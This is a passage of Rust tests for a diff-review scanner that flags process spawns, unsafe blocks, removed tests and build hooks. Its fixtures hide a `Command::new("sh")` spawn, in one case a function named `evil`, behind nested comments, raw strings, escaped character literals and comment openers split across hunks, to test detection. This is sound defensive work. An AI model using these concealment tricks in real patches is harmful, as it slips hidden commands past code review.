    fn removed_tests_are_read_on_the_old_side() {
        let file = removed("src/x.rs", &["#[test]", "fn t() {}"]);
        let found = file_evidence(&file);
        assert_eq!(found.len(), 1);
        assert_eq!(
            (found[0].signal, found[0].side, found[0].line),
            (S::TestRemoved, Side::Old, 2)
        );
        // Adding a test is not evidence of anything.
        assert_eq!(signals(&added("src/x.rs", &["#[test]"])), []);
    }

    /// Until 2026-11-14 the Rust code view ended a block comment at the first `*/` and lost
    /// step after a character literal with a long escape, so a removed test behind either was
    /// not read (the published v0.8.3 binary reports nothing for these two hunks). The
    /// compiler nests the comment and reads the literal whole, and so does the view now.
    #[test]
    fn a_removed_test_behind_a_nested_comment_or_a_long_escape_is_found() {
        let cases: [(&[&str], u32); 2] = [
            (&["/* /* */ // */ #[test]", "fn t() {}"], 2),
            (&[r#"let _ = ('\x41','"', "/*");"#, "#[test]"], 3),
        ];
        for (lines, line) in cases {
            let found: Vec<_> = file_evidence(&removed("src/x.rs", lines))
                .iter()
                .map(|e| (e.signal, e.side, e.line))
                .collect();
            assert_eq!(found, [(S::TestRemoved, Side::Old, line)], "{lines:?}");
        }
    }

    /// What 0.8.3 found in Rust is found, whatever else is. A hunk can start inside a string or
    /// a comment opened above it, and then neither reading of Rust is the compiler's: each can
    /// come back to code where the other does not. Each patch below is one where the reading
    /// of 0.8.3 finds real code and the lexer reading alone finds nothing (measured on the
    /// published v0.8.3 binary: the items expected here, and scores 6, 5, 6 and 5).
    /// - A list kept in a string, with a glob of two wildcard directories: `/*`, `/*` and
    ///   `*/` to a reader that started in code. The reading of 0.8.3 ends its comment at the
    ///   `*/`; the nesting reading is still one deep at the end of the hunk. `git diff`
    ///   writes this hunk for a function added below such a list.
    /// - The same list above a removed test, for the old side.
    /// - Shell text in a raw string with an apostrophe before a quote: the lexer reading
    ///   takes `'\t"%s\n'` for a character literal, and the closing `"#` then opens a string.
    /// - Two added lines of a `build.rs` that hold nothing but a character literal with a
    ///   long escape and one of several bytes: blank to the lexer reading, not to 0.8.3's.
    #[test]
    fn what_the_reading_of_0_8_3_finds_from_an_unknown_start_is_found() {
        let glob = "--- a/src/main.rs\n+++ b/src/main.rs\n@@ -8,6 +8,10 @@\n     LICENSE\n     \
                    crates/*/*/Cargo.toml\n     docs/README.md\n \";\n \n+pub fn run(cmd: &str) \
                    -> bool {\n+    std::process::Command::new(\"sh\").arg(cmd).status().is_ok()\
                    \n+}\n+\n fn main() {\n";
        let removed_test = "--- a/src/main.rs\n+++ b/src/main.rs\n@@ -8,10 +8,6 @@\n     \
                            LICENSE\n     crates/*/*/Cargo.toml\n     docs/README.md\n \";\n \n\
                            -#[test]\n-fn patterns_are_checked() {\n-    \
                            assert!(PATTERNS.lines().count() > 3);\n-}\n fn main() {\n";
        let apostrophe = "--- a/src/main.rs\n+++ b/src/main.rs\n@@ -8,8 +8,8 @@\n     set -eu\n     \
                          cd \"$1\"\n     make\n-    printf done\n-\"#; pub fn f() { g() }\n\
                          +    printf '\\t\"%s\\n' done\n+\"#; pub fn f() { unsafe { \
                          hint2::run(g) } }\n \n \n mod hint2 { pub unsafe fn run(f: fn()) { f() } }\n";
        let build = "--- a/build.rs\n+++ b/build.rs\n@@ -3,2 +3,4 @@\n const T: [char; 2] = [\n\
                     +'\\x41'\n+'é'\n     ];\n";
        let cases: [(&str, &[Found]); 4] = [
            (glob, &[(S::ProcessSpawn, Side::New, 14)]),
            (removed_test, &[(S::TestRemoved, Side::Old, 13)]),
            (apostrophe, &[(S::UnsafeAdded, Side::New, 12)]),
            (
                build,
                &[(S::BuildHook, Side::New, 4), (S::BuildHook, Side::New, 5)],
            ),
        ];
        for (patch, expected) in cases {
            let file = parse(patch).unwrap().remove(0);
            let items = |views_of| -> Vec<Found> {
                let kind = FileKind::of(&file);
                let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
                hunk_matches_in(&file.patch_twin.hunks[0], kind.language, &rules, views_of)
                    .into_iter()
                    .map(|(side, signal, line)| (signal, side, line))
                    .collect()
            };
            assert_eq!(items(Views::All), expected, "{patch}");
            assert_eq!(items(Views::Released), expected, "0.8.3's reading: {patch}");
            assert_eq!(items(Views::Lexer), [], "the lexer reading: {patch}");
            let found: Vec<_> = file_evidence(&file)
                .iter()
                .map(|e| (e.signal, e.side, e.line))
                .collect();
            assert_eq!(found, expected, "{patch}");
        }
    }

    /// An item as the tests of the two readings compare it.
    type Found = (S, Side, u32);

    /// The list 0.8.3 would print for `file`: what its reading alone finds in each hunk, in the
    /// order of the file, cut at the bound.
    fn listed_by_0_8_3(file: &ReviewFile) -> Vec<Found> {
        let kind = FileKind::of(file);
        let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
        file.patch_twin
            .hunks
            .iter()
            .flat_map(|hunk| hunk_matches_in(hunk, kind.language, &rules, Views::Released))
            .map(|(side, signal, line)| (signal, side, line))
            .take(MAX_EVIDENCE_PER_FILE)
            .collect()
    }

    /// What the bounded list of `file` must hold, whatever further readings find: every item
    /// 0.8.3 would list; as many items as the bound allows; in the order of the file; and it
    /// says so when there is more. Returns whether the list is cut, and how many of the items
    /// 0.8.3 would list a cut after the first 32 items of all readings would have dropped.
    fn bounded_list_holds(file: &ReviewFile, text: &str) -> (bool, usize) {
        let all = file_evidence(file);
        let ranked = crate::rank::RankedFile::scored(file);
        let found = |e: &Evidence| (e.signal, e.side, e.line);
        let listed: Vec<Found> = ranked.evidence.iter().map(found).collect();
        let by_0_8_3 = listed_by_0_8_3(file);
        for item in &by_0_8_3 {
            assert!(listed.contains(item), "0.8.3 lists {item:?}:\n{text}");
        }
        assert_eq!(listed.len(), all.len().min(MAX_EVIDENCE_PER_FILE), "{text}");
        assert_eq!(ranked.evidence_truncated, all.len() > MAX_EVIDENCE_PER_FILE);
        let mut rest = all.iter();
        for item in &ranked.evidence {
            assert!(
                rest.any(|e| e == item),
                "not in the order of the file:\n{text}"
            );
        }
        let first: Vec<Found> = all.iter().take(MAX_EVIDENCE_PER_FILE).map(found).collect();
        let dropped = by_0_8_3.iter().filter(|item| !first.contains(item)).count();
        (ranked.evidence_truncated, dropped)
    }

    /// At the bound of 32 the list still holds what 0.8.3 listed. For generated Rust files of
    /// 40 to 120 changed lines, heavy with rule tokens and with the pieces the readings
    /// disagree about (as a new file, as added lines and as removed lines): the list 0.8.3
    /// would print, which is its reading alone cut at 32, is contained in the list printed;
    /// the list is as long as the bound allows and in the order of the file; and an item is
    /// marked released exactly when the reading of 0.8.3 alone finds it. Many of these lists
    /// are cut, and in many a cut after the first 32 items of all readings would have dropped
    /// an item 0.8.3 listed.
    #[test]
    fn the_bounded_list_holds_every_item_0_8_3_listed() {
        use std::fmt::Write as _;
        const ATOMS: [&str; 14] = [
            "unsafe { g() }",
            "std::process::Command::new(\"sh\")",
            "reqwest::blocking::get(u)",
            "#[test]",
            "/* /* */ // */ ",
            "('\\x41','\"', \"/*\"); ",
            "/*",
            "*/",
            "\"",
            "'",
            "x",
            " ",
            "// */",
            "crates/*/*/Cargo.toml",
        ];
        let mut seed = 0x1234_5678_9ABC_DEF1_u64;
        let mut next = move |below: usize| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            usize::try_from(seed % (below as u64)).unwrap()
        };
        let (mut cut, mut would_drop) = (0, 0);
        for case in 0..400 {
            let count = 40 + next(81);
            let sign = if case % 3 == 2 { '-' } else { '+' };
            let mut body = String::new();
            for _ in 0..count {
                // Mostly a rule token alone; often behind the nested comment, which hides
                // it from the reading of 0.8.3 only; now and then one of the other pieces.
                let before = match next(40) {
                    0 => ATOMS[5],
                    1 => ATOMS[6 + next(8)],
                    2..=11 => ATOMS[4],
                    _ => "",
                };
                let _ = writeln!(body, "{sign}{before}{}", ATOMS[next(4)]);
            }
            let text = match case % 3 {
                0 => format!("--- /dev/null\n+++ b/src/x.rs\n@@ -0,0 +1,{count} @@\n{body}"),
                1 => format!(
                    "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,1 +1,{} @@\n x\n{body}",
                    count + 1
                ),
                _ => format!(
                    "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,{} +1,1 @@\n x\n{body}",
                    count + 1
                ),
            };
            let file = parse(&text).unwrap().remove(0);
            let (is_cut, dropped) = bounded_list_holds(&file, &text);
            cut += usize::from(is_cut);
            would_drop += usize::from(dropped > 0);
            // An item is released exactly when the reading of 0.8.3 alone finds it.
            let kind = FileKind::of(&file);
            let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
            let hunk = &file.patch_twin.hunks[0];
            let alone = hunk_matches_in(hunk, kind.language, &rules, Views::Released);
            let (items, marks) = file_evidence_marked(&file, Share::Own);
            assert_eq!(marks, file_evidence_released(&file));
            for (item, released) in items.iter().zip(marks) {
                assert_eq!(
                    released,
                    alone.contains(&(item.side, item.signal, item.line)),
                    "{item:?}:\n{text}"
                );
            }
        }
        assert!(
            cut > 100 && would_drop > 30,
            "{cut} lists cut, {would_drop} where a plain cut would have dropped an item of 0.8.3"
        );
    }

    /// `'r#r"\"` is read by each reading as its editions read it, and the rules read both: the
    /// text written for editions 2015 and 2018 is found by the reading of 0.8.3 (as 0.8.3
    /// found it), the text written for 2021 and 2024 by the lexer reading (0.8.3 missed it).
    #[test]
    fn a_raw_lifetime_before_a_string_hides_nothing_in_any_edition() {
        for (line, by_legacy, by_lexer) in [
            (
                r#"m!('r#r"\"); let s = std::process::Command::new("sh").status(); m!("");"#,
                true,
                false,
            ),
            (
                r#"m!('r#r"\" /* "); let s = std::process::Command::new("sh").status(); m!(" */ ");"#,
                false,
                true,
            ),
        ] {
            let file = added("src/x.rs", &[line]);
            assert_eq!(signals(&file), [S::ProcessSpawn], "{line}");
            let kind = FileKind::of(&file);
            let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
            let hunk = &file.patch_twin.hunks[0];
            for (views_of, finds) in [(Views::Released, by_legacy), (Views::Lexer, by_lexer)] {
                let found = hunk_matches_in(hunk, kind.language, &rules, views_of);
                assert_eq!(!found.is_empty(), finds, "{line}");
            }
        }
    }

    /// No answer is lower than 0.8.3's, by construction, and this holds the construction: for
    /// Rust text of every shape a hunk can have, what the rules find is what the reading of
    /// 0.8.3 finds together with what the lexer reading finds, each read alone. Nothing the
    /// first finds is missing, and nothing is found that neither finds (their bytes are never
    /// mixed into a view of their own). The reading of 0.8.3 is the shared scanner's, whose
    /// code is the released code (`lexical.rs` differs from the release by added lines only),
    /// and it carries a state the other reading never touches. A file's score adds a weight of
    /// at least 1 for each signal found, so it is never lower either.
    ///
    /// The text is made from the pieces the two readings disagree about (quotes, comment
    /// openers and closers, character literals with long escapes, raw strings and prefixes)
    /// with rule tokens between them, as a new file, as added lines below a context line, as
    /// removed lines, and as a mix of context, added and removed lines, on a source path and
    /// on `build.rs`. Other languages have one reading, which is `code_view` itself.
    #[test]
    fn rust_items_are_those_of_0_8_3_and_those_of_the_lexer_reading() {
        const ATOMS: [&str; 42] = [
            "unsafe { g() }",
            "std::process::Command::new(\"sh\")",
            "reqwest::blocking::get(u)",
            "#[test]",
            "fn t() {}",
            "/*",
            "*/",
            "//",
            "\"",
            "'",
            "'\\x41'",
            "'\"'",
            "'\\u{1F600}'",
            "'é'",
            "r\"",
            "r#\"",
            "\"#",
            "b'",
            "b\"",
            "'r#r",
            "k#r",
            "cr\"",
            "\\",
            "\\\"",
            "crates/*/*/Cargo.toml",
            " ",
            " ",
            "x",
            ";",
            "1e",
            "#",
            "/",
            "*",
            "'a",
            "'\\''",
            "/* /* */",
            "// */",
            "\"/*\"",
            "'\\t\"%s\\n'",
            "é",
            "/* /* */ // */ ",
            "('\\x41','\"', \"/*\"); ",
        ];
        let mut seed = 0x9E37_79B9_7F4A_7C15_u64;
        let mut next = move |below: usize| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            usize::try_from(seed % (below as u64)).unwrap()
        };
        assert!(S::ALL.iter().all(|signal| signal.weight() >= 1));
        let (mut only_legacy, mut only_lexer, mut items_seen) = (0, 0, 0);
        for case in 0..4000 {
            let lines: Vec<String> = (0..=next(8))
                .map(|_| (0..=next(6)).map(|_| ATOMS[next(ATOMS.len())]).collect())
                .collect();
            let path = if case % 5 == 0 {
                "build.rs"
            } else {
                "src/x.rs"
            };
            let (mut old, mut new, mut body) = (0, 0, String::new());
            for line in &lines {
                let sign = match case % 4 {
                    0 | 1 => '+',
                    2 => '-',
                    _ => [' ', '+', '-'][next(3)],
                };
                old += u32::from(sign != '+');
                new += u32::from(sign != '-');
                body.push(sign);
                body.push_str(line);
                body.push('\n');
            }
            let text = match case % 4 {
                0 => format!("--- /dev/null\n+++ b/{path}\n@@ -0,0 +1,{new} @@\n{body}"),
                1 | 2 => format!(
                    "--- a/{path}\n+++ b/{path}\n@@ -1,{} +1,{} @@\n x\n{body}",
                    old + 1,
                    new + 1
                ),
                _ => format!("--- a/{path}\n+++ b/{path}\n@@ -7,{old} +7,{new} @@\n{body}"),
            };
            let Ok(mut files) = parse(&text) else {
                continue; // a mix with no changed line is no patch
            };
            let file = files.remove(0);
            let kind = FileKind::of(&file);
            assert_eq!(kind.language, Some(Language::Rust));
            let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
            let hunk = &file.patch_twin.hunks[0];
            let all = hunk_matches_in(hunk, kind.language, &rules, Views::All);
            let legacy = hunk_matches_in(hunk, kind.language, &rules, Views::Released);
            let lexer = hunk_matches_in(hunk, kind.language, &rules, Views::Lexer);
            for item in &legacy {
                assert!(all.contains(item), "0.8.3 finds {item:?}:\n{text}");
            }
            for item in &all {
                assert!(
                    legacy.contains(item) || lexer.contains(item),
                    "neither reading finds {item:?}:\n{text}"
                );
            }
            for item in &lexer {
                assert!(
                    all.contains(item),
                    "the lexer reading finds {item:?}:\n{text}"
                );
            }
            assert_eq!(hunk_matches(hunk, kind.language, &rules), all);
            items_seen += all.len();
            only_legacy += usize::from(legacy.iter().any(|item| !lexer.contains(item)));
            only_lexer += usize::from(lexer.iter().any(|item| !legacy.contains(item)));
        }
        // The generator bites: many items, and many hunks in which one reading finds what the
        // other does not, in each direction.
        assert!(
            items_seen > 2000 && only_legacy > 100 && only_lexer > 100,
            "{items_seen} items, {only_legacy} hunks only 0.8.3 reads, {only_lexer} only the lexer"
        );
        // Every other language has one reading, the shared scanner's.
        for language in [
            Language::Python,
            Language::JavaScript,
            Language::Go,
            Language::Shell,
            Language::Yaml,
        ] {
            let (mut readings, mut state) = (Readings::default(), ScanState::default());
            for _ in 0..500 {
                let line: String = (0..=next(6)).map(|_| ATOMS[next(ATOMS.len())]).collect();
                assert_eq!(
                    code_views(language, &line, &mut readings),
                    [code_view(language, &line, &mut state)],
                    "{language:?}: {line}"
                );
            }
        }
    }

    /// The items of a patch as the tests of hunks compare them.
    fn items(patch: &str) -> Vec<Found> {
        let file = parse(patch).unwrap().remove(0);
        file_evidence(&file)
            .iter()
            .map(|e| (e.signal, e.side, e.line))
            .collect()
    }

    /// A file the patch creates is one text, however many hunks it is written in: what one
    /// hunk leaves open (a block comment here, one deep and two deep) is open in the next.
    /// Read alone, the second hunk is a line comment and nothing else, which is how 0.8.3 and
    /// every release before it read it (the published v0.8.3 binary: score 4, no evidence, for
    /// each of the split forms below).
    ///
    /// What plain `git apply` (2.56.0, `--check -v` and then applied, in scratch repositories)
    /// does with a creation written in several hunks:
    /// - `@@ -0,0 +1,2 @@` then `@@ -2,0 +3,2 @@`: accepted, the lines in patch order.
    /// - a second hunk `@@ -9,0 +3,2 @@`, `@@ -2,0 +1,2 @@` or `@@ -9,0 +9,2 @@`: accepted
    ///   ("Hunk #2 succeeded at 3"), the same file. Its numbers do not place it: a hunk with no
    ///   context after its last line must end the file as it then is, so each is appended.
    /// - a second hunk `@@ -0,0 +3,2 @@` or `@@ -1,0 +3,2 @@`: refused (it would also have to
    ///   begin the file). A hunk with a context line: refused ("new file depends on old
    ///   contents"). Three hunks `-0,0`, `-2,0`, `-3,0`: accepted, in order.
    ///
    /// So every hunk of a creation only adds, and each follows the one before.
    #[test]
    fn the_hunks_of_a_created_file_are_read_as_one_text() {
        let spawn = "pub fn evil() { std::process::Command::new(\"sh\").status().ok(); }";
        let head = "--- /dev/null\n+++ b/src/evil.rs\n";
        for (opener, closer) in [
            ("/*", "// */"),
            ("/* /*", " */ // */"),
            ("const S: &str = \"", "// \";"),
            ("const S: &str = r#\"", "// \"#;"),
        ] {
            let joined = format!(
                "{head}@@ -0,0 +1,4 @@\n+//! Helpers.\n+{opener}\n+{closer} {spawn}\n+pub fn k() {{}}\n"
            );
            let found = [(S::ProcessSpawn, Side::New, 3)];
            assert_eq!(items(&joined), found, "{joined}");
            for second in ["-2,0 +3,2", "-9,0 +3,2"] {
                let split = format!(
                    "{head}@@ -0,0 +1,2 @@\n+//! Helpers.\n+{opener}\n@@ {second} @@\n+{closer} {spawn}\n+pub fn k() {{}}\n"
                );
                assert_eq!(items(&split), found, "{split}");
                // Read alone, as before, the second hunk shows nothing.
                let file = parse(&split).unwrap().remove(0);
                let kind = FileKind::of(&file);
                let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
                assert_eq!(
                    hunk_matches(&file.patch_twin.hunks[1], kind.language, &rules),
                    [],
                    "{split}"
                );
            }
        }
        // Three hunks, with a hunk between the opener and the closer that changes nothing.
        let three = format!(
            "{head}@@ -0,0 +1,1 @@\n+/*\n@@ -2,0 +2,1 @@\n+words\n@@ -3,0 +3,1 @@\n+// */ {spawn}\n"
        );
        assert_eq!(items(&three), [(S::ProcessSpawn, Side::New, 3)]);
        // Other languages have the same boundary and the same rule.
        let script = "--- /dev/null\n+++ b/web/run.js\n@@ -0,0 +1,1 @@\n+/*\n@@ -2,0 +2,1 @@\n\
                      +// */ const cp = require(\"child_process\");\n";
        assert_eq!(items(script), [(S::ProcessSpawn, Side::New, 2)]);
    }

    /// With a line of the file between two hunks that the patch does not show, the second
    /// starts as code, as it always has: what the unseen line holds is not known (it may close
    /// the comment). Each form below is read as 0.8.3 read it, with no item.
    ///
    /// `git apply` (2.56.0) on the twelve-line file: `@@ -1,2 +1,3 @@` then `@@ -4,1 +5,2 @@`
    /// is accepted and line 3 of the file stands between the hunks. (A hunk that only adds is
    /// a different matter: Git appends it, and the next test holds that.)
    #[test]
    fn a_hunk_with_an_unseen_line_before_it_starts_as_code() {
        let spawn = "pub fn evil() { std::process::Command::new(\"sh\").status().ok(); }";
        let head = "--- a/src/f.rs\n+++ b/src/f.rs\n";
        for second in [
            // one unseen line
            format!("@@ -4,1 +5,2 @@\n+// */ {spawn}\n pub fn d() {{}}\n"),
            // an overlap, which Git refuses
            format!("@@ -2,2 +3,3 @@\n pub fn b() {{}}\n+// */ {spawn}\n pub fn c() {{}}\n"),
        ] {
            let patch =
                format!("{head}@@ -1,2 +1,3 @@\n pub fn a() {{}}\n+/*\n pub fn b() {{}}\n{second}");
            assert_eq!(items(&patch), [], "{patch}");
        }
    }

    /// The items of a patch's one file when each hunk is read alone: what the reading of 0.8.3
    /// and the lexer reading find from a start as code.
    fn items_of_hunks_alone(patch: &str) -> Vec<Found> {
        let file = parse(patch).unwrap().remove(0);
        let kind = FileKind::of(&file);
        let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
        file.patch_twin
            .hunks
            .iter()
            .flat_map(|hunk| hunk_matches(hunk, kind.language, &rules))
            .map(|(side, signal, line)| (signal, side, line))
            .collect()
    }

    /// The pieces of the lines of [`no_hunk_of_a_file_has_fewer_items_than_read_alone`].
    const RUN_ATOMS: [&str; 18] = [
        "unsafe { g() }",
        "std::process::Command::new(\"sh\")",
        "/*",
        "*/",
        "//",
        "\"",
        "'\"'",
        "r#\"",
        "\"#",
        " ",
        "x",
        "/* /* */",
        "// */",
        "\"/*\"",
        "#[test]",
        "'\\x41'",
        "// */ unsafe { g() }",
        "\"; unsafe { g() }",
    ];

    /// A carried reading is one more reading and replaces none: for hunks made from the pieces
    /// the readings disagree about, every item a hunk has when it is read alone (which is what
    /// 0.8.3 and the lexer reading find from a start as code, the whole answer before hunks
    /// were joined) is an item of the file, and the per-hunk labels, asked in order, backwards
    /// and one at a time, are the file's. The hunks are a created file cut into hunks, added
    /// lines after one line of an existing file, and an existing file's hunks of every form
    /// with any numbers (added lines only, a line and added lines, context on both sides, a
    /// last line removed), in a file the patch creates and in one that exists. A created file cut into
    /// hunks has every item its lexer reading has as one hunk.
    #[test]
    fn no_hunk_of_a_file_has_fewer_items_than_read_alone() {
        use std::fmt::Write as _;
        let mut seed = 0x2545_F491_4F6C_DD1D_u64;
        let mut next = move |below: usize| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            usize::try_from(seed % (below as u64)).unwrap()
        };
        let (mut more, mut runs) = (0, 0);
        for case in 0..4500 {
            let lines: Vec<String> = (0..=1 + next(7))
                .map(|_| {
                    (0..=next(4))
                        .map(|_| RUN_ATOMS[next(RUN_ATOMS.len())])
                        .collect()
                })
                .collect();
            let created = case % 3 == 0;
            let any_form = case % 3 == 2;
            // Cut the lines into hunks: a creation; added lines after line 5 of an existing
            // file; or hunks of every form at any old position.
            let (mut text, mut at, mut joined) = (String::new(), 0, String::new());
            while at < lines.len() {
                let take = 1 + next(lines.len() - at);
                let (old, new) = if created { (at, at + 1) } else { (5, at + 6) };
                let form = if any_form { next(4) } else { 0 };
                let (old, new) = if any_form {
                    (1 + next(30), 100 * at + 1)
                } else {
                    (old, new)
                };
                let before = RUN_ATOMS[next(RUN_ATOMS.len())];
                match form {
                    0 => {
                        let _ = writeln!(text, "@@ -{old},0 +{new},{take} @@");
                    }
                    1 => {
                        let _ = writeln!(text, "@@ -{old},1 +{new},{} @@\n {before}", take + 1);
                    }
                    _ => {
                        let _ =
                            writeln!(text, "@@ -{old},2 +{new},{} @@\n {before}", take + 4 - form);
                    }
                }
                for line in &lines[at..at + take] {
                    let _ = writeln!(text, "+{line}");
                    let _ = writeln!(joined, "+{line}");
                }
                match form {
                    2 => text.push_str(" after\n"),
                    3 => text.push_str("-gone\n"),
                    _ => {}
                }
                at += take;
            }
            let head = if created {
                "--- /dev/null\n+++ b/src/x.rs\n"
            } else {
                "--- a/src/x.rs\n+++ b/src/x.rs\n"
            };
            let file = parse(&format!("{head}{text}")).unwrap().remove(0);
            let gaining = hunks_with_more_than_alone(&file, &text);
            // Only the hunks of a creation go on from one another.
            assert!(created || gaining == 0, "a file that exists:\n{text}");
            more += gaining;
            let kind = FileKind::of(&file);
            let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
            let evidence = file_evidence(&file);
            let hunks = &file.patch_twin.hunks;
            runs += usize::from(hunks.len() > 1);
            if created {
                let one = format!("{head}@@ -0,0 +1,{} @@\n{joined}", lines.len());
                let one = parse(&one).unwrap().remove(0);
                let lexer = hunk_matches_in(
                    &one.patch_twin.hunks[0],
                    kind.language,
                    &rules,
                    Views::Lexer,
                );
                for (side, signal, line) in lexer {
                    assert!(
                        evidence
                            .iter()
                            .any(|e| (e.side, e.signal, e.line) == (side, signal, line)),
                        "the file as one hunk has {signal:?} on line {line}:\n{text}"
                    );
                }
            }
        }
        assert!(
            runs > 3000 && more > 60,
            "{runs} runs, {more} hunks with more than alone"
        );
    }

    /// Not closed, and stated: the hunks of a file that exists are read each on its own,
    /// whatever their numbers say. Each of these hides a spawn behind a comment that an
    /// earlier hunk opened, in a form plain `git apply` 2.56.0 puts together (its words are in
    /// the changelog), and each is answered as its hunks are answered alone: no spawn, as in
    /// 0.8.3. Where positions Git would not write are refused is the parser, not here.
    #[test]
    fn the_hunks_of_a_file_that_exists_are_read_each_on_its_own() {
        let spawn = "pub fn evil() { std::process::Command::new(\"sh\").status().ok(); }";
        let head = "--- a/src/lib.rs\n+++ b/src/lib.rs\n";
        for hunks in [
            // a hunk that begins where the one before it ends, by its numbers
            format!(
                "@@ -1,2 +1,3 @@\n pub fn a() {{}}\n+/*\n pub fn b() {{}}\n@@ -3,1 +4,2 @@\n+// */ {spawn}\n \
                 pub fn c() {{}}\n"
            ),
            // a hunk of added lines only, which Git appends after the hunk that ended the file
            format!(
                "@@ -12,1 +12,2 @@\n pub fn l() {{}}\n+/*\n@@ -50,0 +52,1 @@\n+// */ {spawn}\n"
            ),
            // the same with its true number, below a last line shown as context
            format!(
                "@@ -2,2 +2,3 @@\n pub fn two() {{}}\n+/*\n pub fn three() {{}}\n@@ -3,0 +5,1 @@\n\
                 +// */ {spawn}\n"
            ),
            // a chain of the two: by its number, then appended with a false one
            format!(
                "@@ -2,2 +2,3 @@\n pub fn two() {{}}\n+/*\n pub fn three() {{}}\n@@ -3,0 +5,1 @@\n\
                 +still a comment\n@@ -9,0 +6,1 @@\n+// */ {spawn}\n"
            ),
        ] {
            let patch = format!("{head}{hunks}");
            assert_eq!(items(&patch), [], "{patch}");
            assert_eq!(items(&patch), items_of_hunks_alone(&patch), "{patch}");
        }
        // Removed lines too: a test removed below a string that the hunk above opened.
        let removed = format!(
            "{head}@@ -1,1 +0,0 @@\n-const S: &str = \"\n@@ -2,2 +0,0 @@\n-\"; #[test]\n-fn t() {{}}\n"
        );
        assert_eq!(items(&removed), items_of_hunks_alone(&removed));
    }

    /// `hunk_signals` answers for the hunk it is given, read alone, as every release up to
    /// 0.8.3 did (with what the second reading of Rust finds): it needs no other hunk of the
    /// file. The second hunk of a creation, whose line stands behind a comment the first
    /// opened, has no label there; the views take its label from a reading of the creation as
    /// one text (the rank's, or a [`HunkLabels`]), which has the spawn.
    #[test]
    fn hunk_signals_reads_the_hunk_given_alone() {
        let spawn = "std::process::Command::new(\"sh\");";
        let file = parse(&format!(
            "--- /dev/null\n+++ b/src/x.rs\n@@ -0,0 +1,1 @@\n+/*\n@@ -0,0 +2,1 @@\n+// */ {spawn}\n\
             @@ -0,0 +3,1 @@\n+/* /* */ // */ {spawn}\n"
        ))
        .unwrap()
        .remove(0);
        let hunks = &file.patch_twin.hunks;
        assert_eq!(hunk_signals(&file, &hunks[1]), []);
        assert_eq!(hunk_signals(&file, &hunks[2]), [S::ProcessSpawn]);
        assert_eq!(HunkLabels::new(&file).of(1), [S::ProcessSpawn]);
        // Any hunk, of this file or not: its own lines decide.
        let mut other = hunks[2].clone();
        other.id = hunks[1].id;
        assert_eq!(hunk_signals(&file, &other), [S::ProcessSpawn]);
    }

    /// The bound on what reading costs, for any patch, counted and not timed. For each side a
    /// line is on, one view of it is made as 0.8.3 made it and for Rust one more by the lexer
    /// reading; on its new side one more when it stands in a later hunk of a creation; and
    /// of these views one is alive at a time. A view is made by scanning the line once for
    /// each reading it unites: up to eight times for the view of 0.8.3 (as in 0.8.3), five
    /// for the lexer's, and five (Rust) or eight for the carried one. 2,000 generated
    /// files of every shape (created, changed, deleted; Rust and JavaScript; added, removed
    /// and context lines; openers of comments and of strings that saturate the readings),
    /// read in file order as the rank reads and by address in reverse; and the shape that
    /// cost the most in review, as a creation: seven hunks that leave four kinds of literal
    /// open, then a thousand one-line hunks.
    #[test]
    fn no_line_is_scanned_more_than_its_bound_and_one_view_is_alive_at_a_time() {
        use std::fmt::Write as _;
        const ATOMS: [&str; 14] = [
            "unsafe { g() }",
            "std::process::Command::new(\"sh\")",
            "/*",
            "*/",
            "\"",
            "r#\"",
            "\"#",
            "b\"",
            "'\\",
            "`",
            "${",
            "// */ x",
            "x",
            "/* /* */",
        ];
        let mut seed = 0x0BAD_5EED_0BAD_5EED_u64;
        let mut next = move |below: usize| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            usize::try_from(seed % (below as u64)).unwrap()
        };
        let mut texts: Vec<String> = Vec::new();
        let mut case = 0;
        while texts.len() < 2000 {
            case += 1;
            let path = if case % 5 == 0 {
                "src/x.js"
            } else {
                "src/x.rs"
            };
            let shape = case % 3; // created, changed, deleted
            let mut text = match shape {
                0 => format!("--- /dev/null\n+++ b/{path}\n"),
                1 => format!("--- a/{path}\n+++ b/{path}\n"),
                _ => format!("--- a/{path}\n+++ /dev/null\n"),
            };
            let (mut old, mut new) = (1, 1);
            for _ in 0..=next(5) {
                let kinds: Vec<char> = (0..=next(4))
                    .map(|_| match shape {
                        0 => '+',
                        1 => [' ', '+', '-', '+'][next(4)],
                        _ => '-',
                    })
                    .collect();
                let olds = kinds.iter().filter(|k| **k != '+').count();
                let news = kinds.iter().filter(|k| **k != '-').count();
                let from = if shape == 0 { 0 } else { old };
                let _ = writeln!(text, "@@ -{from},{olds} +{new},{news} @@");
                for kind in kinds {
                    let line: Vec<&str> = (0..=next(3)).map(|_| ATOMS[next(ATOMS.len())]).collect();
                    let _ = writeln!(text, "{kind}{}", line.join(" "));
                }
                // The next hunk begins where this one ends, or further on.
                old += olds + next(2) * 7;
                new += news;
            }
            // A text the parser refuses is not counted: 2,000 are read.
            if parse(&text).is_ok() {
                texts.push(text);
            }
        }
        assert_eq!(texts.len(), 2000);
        // The shape of the review, as a creation.
        let mut four = "--- /dev/null\n+++ b/src/four.rs\n".to_owned();
        let openers = [
            "r#\"",
            "\"#; r##\"",
            "\"##; \"",
            "\"; b\"",
            "\"; '\\",
            "x /*",
            "*/ r\"",
        ];
        for (at, line) in openers.iter().enumerate() {
            let _ = writeln!(four, "@@ -0,0 +{},1 @@\n+{line}", at + 1);
        }
        for at in 0..1000 {
            let _ = writeln!(
                four,
                "@@ -0,0 +{},1 @@\n+let v{at} = \" r#\" '\\ /* x",
                at + 8
            );
        }
        texts.push(four);
        for text in &texts {
            let file = parse(text).unwrap().remove(0);
            let hunks = &file.patch_twin.hunks;
